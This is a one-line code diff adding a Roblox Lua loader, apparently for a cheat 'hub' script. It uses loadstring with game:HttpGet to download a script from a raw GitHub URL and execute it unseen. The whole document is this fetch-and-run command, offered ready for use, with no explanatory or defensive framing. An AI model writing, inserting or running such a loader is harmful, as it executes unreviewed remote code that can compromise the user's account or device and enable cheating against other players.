@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cashiolaa/-cash-hub/main/%24%20cash%20hub"))()
